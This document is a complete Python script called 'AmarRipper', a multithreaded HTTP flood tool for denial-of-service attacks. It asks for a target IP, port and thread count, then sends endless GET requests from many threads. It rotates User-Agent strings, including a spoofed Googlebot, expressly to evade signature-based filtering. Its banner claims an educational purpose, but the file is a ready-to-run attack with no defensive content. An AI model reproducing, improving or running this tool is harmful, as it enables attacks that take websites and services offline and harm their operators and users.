import socket
import threading
import random
import os
import sys
import time

# --- AMARRIPPER CONFIGURATION ---
BANNER = r'''
 █████╗ ███╗   ███╗ █████╗ ██████╗ ██████╗ ██╗██████╗ ██████╗ ███████╗██████╗ 
██╔══██╗████╗ ████║██╔══██╗██╔══██╗██╔══██╗██║██╔══██╗██╔══██╗██╔════╝██╔══██╗
███████║██╔████╔██║███████║██████╔╝██████╔╝██║██████╔╝██████╔╝█████╗  ██████╔╝
██╔══██║██║╚██╔╝██║██╔══██║██╔══██╗██╔══██╗██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗
██║  ██║██║ ╚═╝ ██║██║  ██║██║  ██║██║  ██║██║██║     ██║     ███████╗██║  ██║
╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝
                            [ Version 1.0 ]
                    Developed for Educational Audits
'''

# List of User-Agents to bypass simple signature-based filters
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
]

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def attack(target_ip, target_port):
    """Core function to send packets to the target."""
    while True:
        try:
            # Create a TCP socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            
            # Craft a basic HTTP GET request
            msg = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\n\r\n".encode()
            s.send(msg)
            
            print(f"[\033[92m+\033[0m] Packet Sent to {target_ip}:{target_port}")
            s.close()
        except socket.error:
            print(f"[\033[91m!\033[0m] Connection Failed. Target may be down or rate-limiting.")
            time.sleep(0.1)

def main():
    clear_screen()
    print("\033[96m" + BANNER + "\033[0m")
    
    # User Input
    print("-" * 50)
    target_ip = input("Enter Target IP: ")
    try:
        target_port = int(input("Enter Target Port (default 80): ") or 80)
        thread_count = int(input("Enter Thread Count (Turbo level, e.g. 135): ") or 135)
    except ValueError:
        print("Invalid input. Using defaults.")
        target_port = 80
        thread_count = 135

    print(f"\n[\033[94m*\033[0m] Launching AmarRipper on {target_ip}:{target_port} with {thread_count} threads...")
    time.sleep(2)

    # Threading logic
    for i in range(thread_count):
        thread = threading.Thread(target=attack, args=(target_ip, target_port))
        thread.start()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[\033[93m!\033[0m] AmarRipper Stopped by User.")
        sys.exit()
